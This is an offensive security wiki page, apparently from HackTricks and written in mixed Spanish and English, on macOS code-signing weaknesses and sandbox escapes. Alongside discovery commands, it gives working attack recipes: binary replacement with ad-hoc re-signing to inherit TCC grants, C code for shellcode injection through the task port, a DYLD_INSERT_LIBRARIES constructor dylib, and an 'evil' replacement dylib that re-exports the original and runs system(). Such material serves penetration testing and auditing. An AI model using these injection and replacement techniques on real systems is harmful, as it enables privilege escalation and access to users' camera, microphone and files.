# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Información básica

**Ad-hoc signing** (`CS_ADHOC`) crea una firma de código con **ninguna cadena de certificados** — es un hash del código sin verificación de identidad del desarrollador. El origen del binario no puede rastrearse a ningún desarrollador u organización.

En Apple Silicon Macs, todos los ejecutables requieren como mínimo una firma ad-hoc. Esto significa que encontrarás firmas ad-hoc en muchas herramientas de desarrollo, paquetes de Homebrew y utilidades de terceros.

### Por qué importa

- **Sin identidad verificable** — el binario puede ser reemplazado sin ser detectado por verificaciones basadas en identidad
- Los binarios ad-hoc de terceros en **posiciones privilegiadas** (FDA, daemon, helpers) son objetivos de alta prioridad
- En algunas configuraciones, las firmas ad-hoc pueden **no verificarse tan estrictamente** como el código firmado por desarrollador
- Los binarios firmados ad-hoc que tienen **permisos de TCC** son especialmente valiosos — los permisos persisten incluso si el contenido del binario cambia (depende de cómo TCC haya indexado ese permiso)

### Descubrimiento
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Ataque: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Procesos depurables (get-task-allow)

### Información básica

El **`com.apple.security.get-task-allow`** entitlement (o la flag `CS_GET_TASK_ALLOW`) permite que **cualquier proceso se adjunte como debugger**, leer la memoria, modificar registros, inyectar código y controlar la ejecución.

Esto está destinado **solo para compilaciones de desarrollo**. Sin embargo, algunos binarios de terceros se distribuyen con este entitlement en producción.

> [!CAUTION]
> Un binario en producción con `get-task-allow` es una **primitiva de explotación instantánea**. Cualquier proceso local puede llamar a `task_for_pid()`, obtener el Mach task port del objetivo, e inyectar código arbitrario que se ejecute con los entitlements del objetivo, las concesiones TCC y el contexto de seguridad.

### Descubrimiento
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Ataque: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Sin validación de librerías + entorno DYLD

### La combinación letal

Cuando un binario tiene **ambos**:
- `com.apple.security.cs.disable-library-validation` (carga cualquier dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (acepta DYLD env vars)

Esto es un **primitivo de inyección de código garantizado** — `DYLD_INSERT_LIBRARIES` funciona perfectamente.

### Descubrimiento
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Ataque: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) punch holes in the App Sandbox:

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Conectarse a servicios XPC/Mach a nivel del sistema |
| `temporary-exception.files.absolute-path.read-write` | Leer/escribir archivos fuera del contenedor de la app |
| `temporary-exception.iokit-user-client-class` | Abrir conexiones user-client de IOKit |
| `temporary-exception.shared-preference.read-only` | Leer las preferencias de otras apps |
| `temporary-exception.files.home-relative-path.read-write` | Acceder a rutas relativas a `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

The most dangerous exception is **mach-lookup** — it allows a sandboxed app to talk to privileged daemons:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Ataque: Sandbox Escape mediante Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Entitlements privados de Apple

### Qué son

Los entitlements con prefijo `com.apple.private.*` proporcionan acceso a **APIs internas de Apple** que no están documentadas ni disponibles para desarrolladores de terceros. Los binarios de terceros con entitlements privados los obtuvieron mediante enterprise cert, MDM, o distribución fuera del App-Store.

### Entitlements privados peligrosos

| Entitlement | Capacidad |
|---|---|
| `com.apple.private.tcc.manager` | Lectura/escritura completa de la base de datos TCC |
| `com.apple.private.tcc.allow` | Acceso a servicios TCC específicos |
| `com.apple.private.security.no-sandbox` | Ejecutar sin sandbox |
| `com.apple.private.iokit` | Acceso directo a controladores IOKit |
| `com.apple.private.kernel.\*` | Acceso a la interfaz del kernel |
| `com.apple.private.xpc.launchd.job-label` | Registrar/gestionar jobs de launchd |
| `com.apple.rootless.install` | Escribir en rutas protegidas por SIP |

### Descubrimiento
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Perfiles de Sandbox Personalizados (SBPL)

### Qué son

Los binarios pueden incluir **perfiles de sandbox personalizados** escritos en SBPL (Seatbelt Profile Language). Estos perfiles pueden ser más restrictivos O **más permisivos** que el App Sandbox predeterminado.

### Auditoría de perfiles personalizados
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Rutas de bibliotecas escribibles

### Qué son

Cuando un binary carga una dynamic library desde una ruta que el usuario actual puede **write to**, la library puede ser reemplazada por código malicioso.

### Descubrimiento
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Ataque: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
